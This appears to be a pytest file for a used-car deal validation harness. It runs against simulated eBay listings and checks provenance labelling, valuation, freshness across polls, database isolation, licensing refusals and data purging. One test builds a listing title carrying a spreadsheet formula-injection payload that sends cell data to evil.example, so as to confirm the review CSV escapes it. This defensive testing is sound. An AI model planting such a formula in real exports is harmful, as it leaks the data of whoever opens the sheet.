"""
tests/test_validate_deals.py — the real-deal validation harness.

Every listing here is a SIMULATED fixture served by a stand-in for eBay's
Browse API; the harness must say so in its report and must never call such
a run a live-data result. Covers: licensing and credential refusal,
pipeline output (dedupe, valuation, risk flags, freshness across polls),
human review -> false-positive metrics, isolation from the configured
database and from notifications, and purging provider data.
"""
from __future__ import annotations

import csv
import json
import os
import subprocess
import sys
import threading
from datetime import datetime, timedelta, timezone
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
from pathlib import Path

import pytest
import requests

ROOT = Path(__file__).resolve().parent.parent
NEAR = {"city": "Northport", "stateOrProvince": "AL", "postalCode": "35473", "country": "US"}


def item(i, price, title="2015 Toyota Camry SE 130k miles", **kw):
    """One SIMULATED Browse item summary."""
    it = {"itemId": f"v1|{i}|0", "title": title, "itemWebUrl": f"https://www.ebay.test/itm/{i}",
          "price": {"value": f"{price}.00", "currency": "USD"}, "buyingOptions": ["FIXED_PRICE"],
          "itemLocation": NEAR, "itemCreationDate": "2026-10-29T12:00:00.000Z",
          "seller": {}, "distanceFromPickupLocation": {"value": "6", "unitOfMeasure": "MILE"},
          "shortDescription": "clean title, runs great"}
    it.update(kw)
    return it


def market():
    peers = [item(100 + i, p) for i, p in enumerate(
        (10000, 10400, 9800, 10200, 10600, 9900, 10100, 10300, 10500, 9700))]
    ends = (datetime.now(timezone.utc) + timedelta(days=5)).strftime("%Y-%m-%dT%H:%M:%S.000Z")
    return peers + [
        item(1, 6900),                                               # a candidate
        item(2, 6900, shortDescription="front end damage, drives fine"),
        item(3, 6500, buyingOptions=["AUCTION"], itemEndDate=ends),
        item(4, 12000, title="2015 Toyota Camry SE 120k miles")]     # overpriced


class Stand:
    """Stand-in HTTP behavior shared by the in-process and CLI tests."""
    def __init__(self):
        self.pages = [market()]
        self.gets = 0

    def page(self):
        self.gets += 1
        items = self.pages.pop(0) if len(self.pages) > 1 else self.pages[0]
        return {"total": len(items), "itemSummaries": items}


@pytest.fixture()
def stand(app, monkeypatch):
    import sources.ebay_motors as eb
    st = Stand()
    monkeypatch.setenv("EBAY_CLIENT_ID", "stand-in-id")
    monkeypatch.setenv("EBAY_CLIENT_SECRET", "stand-in-secret")
    monkeypatch.setattr(eb, "_TOKEN", {"value": None, "expires_at": 0})
    monkeypatch.setattr(eb, "OAUTH_URL", "http://127.0.0.1:9/identity/v1/oauth2/token")
    monkeypatch.setattr(eb, "BROWSE_URL", "http://127.0.0.1:9/buy/browse/v1/item_summary/search")

    class R:
        def __init__(self, body):
            self.status_code, self.text = 200, json.dumps(body)
            self.headers, self.content = {"Content-Type": "application/json"}, self.text.encode()

        def json(self):
            return json.loads(self.text)
    monkeypatch.setattr(requests, "post", lambda *a, **k: R({"access_token": "t",
                                                             "expires_in": 7200}))
    monkeypatch.setattr(requests, "get", lambda *a, **k: R(st.page()))
    return st


def run(tmp_path, **kw):
    import validate_deals as vd
    kw.setdefault("sleep", lambda s: None)
    return vd.run(tmp_path / "run", **kw)


def by_id(rep):
    return {c["source_listing_id"]: c for c in rep["candidates"]}


def test_stand_in_data_is_never_reported_as_real(stand, tmp_path):
    rep = run(tmp_path)
    assert rep["data_kind"] == "stand_in" and rep["live_data_verified"] is False
    assert rep["headline"].startswith("NOT REAL MARKET DATA")
    assert rep["sources"]["ebay"]["provenance"] == "stand_in"
    assert all(c["provenance"] == ["stand_in"] for c in rep["candidates"])


def test_pipeline_finds_the_deal_and_labels_the_traps(stand, tmp_path):
    rep = run(tmp_path)
    f = rep["funnel"]
    assert f["retrieved"] == 14 and f["unique_listings"] == 14 and f["valued"] >= 13
    c = by_id(rep)
    deal = c["v1|1|0"]
    assert deal["trust"] == "trusted" and deal["discount_pct"] > 20
    assert deal["valuation"]["evidence_class"] == "asking_comparables"
    assert deal["valuation"]["comparables"] and deal["valuation"]["reasons"]
    assert all(x["kind"] == "asking" for x in deal["valuation"]["comparables"])
    assert deal["estimated_profit"]["basis"].startswith("ESTIMATE")
    assert deal["url"] == "https://www.ebay.test/itm/1" and deal["source"] == "ebay"
    assert "needs_work" in c["v1|2|0"]["risk_flags"] and c["v1|2|0"]["trust"] == "risk"
    assert "auction_bid" in c["v1|3|0"]["risk_flags"] and c["v1|3|0"]["trust"] == "risk"
    assert "v1|4|0" not in c                                   # overpriced: no candidate
    assert list(c)[0] == "v1|1|0"                              # trusted first


def test_freshness_tracks_relisting_and_price_changes_across_polls(stand, tmp_path):
    second = [x for x in market() if x["itemId"] != "v1|2|0"]
    second = [dict(x, price={"value": "7000.00", "currency": "USD"})
              if x["itemId"] == "v1|1|0" else x for x in second]
    stand.pages = [market(), second]
    rep = run(tmp_path, polls=2)
    c = by_id(rep)
    assert c["v1|1|0"]["price"] == 7000                        # re-valued at the new price
    assert c["v1|1|0"]["freshness"]["seen_in_polls"] == "2/2"
    assert c["v1|1|0"]["freshness"]["confirmed_in_last_poll"] is True
    assert c["v1|2|0"]["freshness"]["confirmed_in_last_poll"] is False
    assert c["v1|2|0"]["freshness"]["seen_in_polls"] == "1/2"
    assert rep["sources"]["ebay"]["listings"] == [14, 13] and stand.gets == 2


def test_nothing_reaches_customers(stand, tmp_path, monkeypatch):
    """Even with owner text alerts switched on in the configuration, the
    deal that qualifies for an owner alert creates no notification job."""
    import sniper
    monkeypatch.setitem(sniper.CONFIG, "notify_text_enabled", True)
    monkeypatch.setitem(sniper.CONFIG, "notify_min_score", 0)
    rep = run(tmp_path)
    iso = rep["isolation"]
    assert iso["owner_alert_rows"] >= 1 and by_id(rep)["v1|1|0"]["would_alert_owner"]
    assert iso["users"] == 0 and iso["user_matches"] == 0 and iso["notify_jobs"] == 0
    assert sniper.CONFIG["notify_text_enabled"] is True           # restored after the run
    assert sniper._config_mod.reload.__name__ == "reload"


def test_unlicensed_and_unconfigured_sources_are_refused(app, tmp_path, monkeypatch):
    monkeypatch.delenv("EBAY_CLIENT_ID", raising=False)
    monkeypatch.delenv("EBAY_COMMERCIAL_AGREEMENT", raising=False)
    monkeypatch.delenv("MARKETCHECK_COMMERCIAL_AGREEMENT", raising=False)
    rep = run(tmp_path, source_ids=("ebay", "marketcheck_fsbo", "craigslist"))
    refused = {r["source"]: r for r in rep["runs"][-1]["refused"]}
    assert refused["ebay"]["kind"] == "licensing"            # production eBay: approval first
    assert "EBAY_COMMERCIAL_AGREEMENT" in refused["ebay"]["why"]
    assert refused["marketcheck_fsbo"]["kind"] == "licensing"
    assert "commercial agreement" in refused["marketcheck_fsbo"]["why"]
    assert refused["craigslist"]["kind"] == "licensing"
    assert rep["funnel"]["retrieved"] == 0 and rep["data_kind"] == "none"
    monkeypatch.setenv("EBAY_COMMERCIAL_AGREEMENT", "EPN approval ref")
    rep = run(tmp_path, source_ids=("ebay",))
    assert rep["runs"][-1]["refused"][0]["kind"] == "credentials"


def test_review_labels_become_false_positive_metrics_and_survive_reruns(stand, tmp_path):
    import validate_deals as vd
    rep = run(tmp_path)
    sheet = tmp_path / "run" / "review.csv"
    rows = list(csv.DictReader(sheet.open()))
    assert {r["source_listing_id"] for r in rows} == set(by_id(rep))
    for r in rows:
        r["outcome_label"] = {"v1|1|0": "genuine_opportunity",
                              "v1|2|0": "mechanical_condition_problem"}.get(
            r["source_listing_id"], "")
    with sheet.open("w", newline="") as f:
        w = csv.DictWriter(f, fieldnames=list(rows[0]))
        w.writeheader()
        w.writerows(rows)
    rep = vd.build_report(tmp_path / "run")
    assert rep["review"]["trusted"]["genuine"] == 1 and rep["review"]["trusted"]["precision"] == 1.0
    assert rep["review"]["trusted"]["precision_lower_95"] == 0.207     # 1 of 1 proves little
    assert "20 needed" in rep["review"]["trusted"]["sample_note"]
    assert rep["review"]["risk"]["false_positive_reasons"] == {"mechanical_condition_problem": 1}
    run(tmp_path)                                             # a second run keeps the labels
    labels = {r["source_listing_id"]: r["outcome_label"] for r in csv.DictReader(sheet.open())}
    assert labels["v1|1|0"] == "genuine_opportunity"
    # the sheet imports into the evaluation store unchanged
    import evaluation
    assert evaluation.import_csv(str(sheet)) == len(labels)


def test_purge_removes_listing_content_but_keeps_labels(stand, tmp_path):
    import validate_deals as vd
    run(tmp_path)
    d = tmp_path / "run"
    (d / "harness.db").write_bytes(b"x")       # stand-in for the run database file
    gone = vd.purge(d)
    assert "harness.db" in gone and not (d / "harness.db").exists()
    rep = json.loads((d / "report.json").read_text())
    assert rep["purged_at"] and all(set(c) <= {"source", "source_listing_id", "trust",
                                               "risk_flags", "discount_pct", "outcome_label"}
                                    for c in rep["candidates"])
    text = (d / "report.json").read_text() + (d / "review.csv").read_text()
    assert "ebay.test" not in text and "Camry" not in text


def test_wilson_lower_bound():
    import validate_deals as vd
    assert vd.wilson_lower(0, 0) is None
    assert vd.wilson_lower(14, 20) == 0.481          # 70% of 20: can't claim 50%
    assert vd.wilson_lower(28, 40) == 0.546          # 70% of 40: can
    assert vd.wilson_lower(20, 20) == 0.839


# ---------- the CLI, as the owner runs it ------------------------------------

class _Handler(BaseHTTPRequestHandler):
    stand = None

    def _send(self, body):
        data = json.dumps(body).encode()
        self.send_response(200)
        self.send_header("Content-Type", "application/json")
        self.send_header("Content-Length", str(len(data)))
        self.end_headers()
        self.wfile.write(data)

    def do_POST(self):                                     # OAuth token
        self.rfile.read(int(self.headers.get("Content-Length") or 0))
        self._send({"access_token": "t", "expires_in": 7200})

    def do_GET(self):                                      # Browse search
        self._send(self.stand.page())

    def log_message(self, *a):
        pass


def test_cli_run_is_isolated_and_exit_code_says_not_real(tmp_path):
    """Owner's command against a local stand-in endpoint: the configured
    databases are never touched (an unreachable Postgres URL and a sentinel
    SQLite path stay unused) and the exit code is 3, not 0."""
    _Handler.stand = Stand()
    srv = ThreadingHTTPServer(("127.0.0.1", 0), _Handler)
    threading.Thread(target=srv.serve_forever, daemon=True).start()
    sentinel = tmp_path / "configured.db"
    env = {**{k: v for k, v in os.environ.items() if not k.startswith(("EBAY_", "SNIPER_"))},
           "EBAY_API_BASE": f"http://127.0.0.1:{srv.server_address[1]}",
           "EBAY_CLIENT_ID": "stand-in-id", "EBAY_CLIENT_SECRET": "stand-in-secret",
           "DATABASE_URL": "postgresql://nobody@127.0.0.1:1/never_used",
           "SNIPER_DB_PATH": str(sentinel)}
    out = tmp_path / "cli-run"
    try:
        r = subprocess.run([sys.executable, "-m", "validate_deals", "run", "--out", str(out),
                            "--zip", "35401", "--radius", "150"], cwd=ROOT, env=env,
                           capture_output=True, text=True, timeout=120)
    finally:
        srv.shutdown()
    assert r.returncode == 3, r.stdout + r.stderr
    assert "NOT REAL MARKET DATA" in r.stdout
    assert not sentinel.exists()
    rep = json.loads((out / "report.json").read_text())
    assert rep["isolation"]["database"] == {"engine": "sqlite", "path": str(out / "harness.db")}
    assert rep["funnel"]["trusted_candidates"] >= 1
    assert oct((out).stat().st_mode & 0o777) == oct(0o700)


def test_review_sheet_cannot_carry_spreadsheet_formulas(stand, tmp_path):
    stand.pages = [market() + [item(9, 6900, title='=HYPERLINK("https://evil.example/?d="&A2) 2015 Toyota Camry SE 130k miles')]]
    run(tmp_path)
    rows = {r["source_listing_id"]: r for r in csv.DictReader((tmp_path / "run" / "review.csv").open())}
    assert rows["v1|9|0"]["title"].startswith("'=")


def test_labels_survive_a_sheet_saved_with_a_bom(stand, tmp_path):
    import validate_deals as vd
    run(tmp_path)
    sheet = tmp_path / "run" / "review.csv"
    rows = list(csv.DictReader(sheet.open()))
    rows[0]["outcome_label"] = "genuine_opportunity"
    with sheet.open("w", newline="", encoding="utf-8-sig") as f:      # as Excel saves it
        w = csv.DictWriter(f, fieldnames=list(rows[0]))
        w.writeheader()
        w.writerows(rows)
    rep = vd.build_report(tmp_path / "run")
    assert sum(1 for c in rep["candidates"] if c["outcome_label"]) == 1
